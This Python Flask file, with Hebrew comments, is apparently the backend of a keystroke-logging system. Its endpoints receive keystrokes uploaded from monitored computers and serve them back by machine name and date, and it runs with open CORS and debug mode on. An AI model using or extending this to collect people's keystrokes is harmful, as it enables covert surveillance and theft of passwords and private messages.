from flask import Flask, jsonify
from request_functions import RequestFunctions
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

request_handler = RequestFunctions()

@app.route('/api/upload', methods=['POST'])
def upload():
    """העלאת ההקשות שנאספו מהמחשב שבמעקב"""
    try:
        result = request_handler.upload()
        if 'Error' in result:
            print(result)
            return jsonify(result), 400
        return jsonify(result), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

@app.route('/api/get_machines_names', methods=['GET'])
def get_machines_names():
    """קבלת רשימת שמות המחשבים שבמעקב"""
    try:
        result = request_handler.get_machines_names()
        if 'Error' in result:
            return jsonify(result), 400
        return jsonify(result), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

@app.route('/api/get_dates_by_name/<name>', methods=['GET'])
def get_dates_by_name(name):
    """קבלת רשימת התאריכים שנאספו עד כה על מחשב ספציפי"""
    try:
        result = request_handler.get_dates_by_name(name)
        if 'Error' in result:
            return jsonify(result), 400
        return jsonify(result), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

@app.route('/api/get_keystrokes_by_name_and_date/<name>/<date>', methods=['GET'])
def get_keystrokes_by_name_and_date(name, date):
    """קבלת מידע ההקשות ממחשב מסוים ביום מסוים"""
    try:
        result = request_handler.get_keystrokes_by_name_and_date(name, date)
        if 'Error' in result:
            return jsonify(result), 400
        return jsonify(result), 200
    except Exception as e:
        return jsonify({'Error': e}), 500


if __name__ == '__main__':
    app.run(debug=True)
